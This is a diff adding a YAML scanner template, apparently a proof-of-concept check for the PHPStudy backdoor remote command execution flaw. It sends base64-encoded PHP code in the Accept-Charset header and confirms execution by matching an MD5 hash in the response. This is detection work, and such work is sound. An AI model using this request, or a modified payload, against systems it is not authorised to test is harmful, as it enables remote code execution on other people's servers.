@@ -1,0 +1,18 @@
+id: poc-yaml-phpstudy-backdoor-rce
+info:
+  name: PHPStudy 后门远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: PHPStudy
+  osprey-id: vb_2019_0055
+requests:
+- method: GET
+  path: /
+  headers:
+    Accept-Charset: dmFyX2R1bXAobWQ1KDB4MTIzNCkpOw==
+    Accept-Encoding: gzip,deflate
+  expression: contains(body, "ee0b86d2e127f776eaaa97d77e078e41") && contains(body,
+    "(32)")
+variables: {}
+transport: http
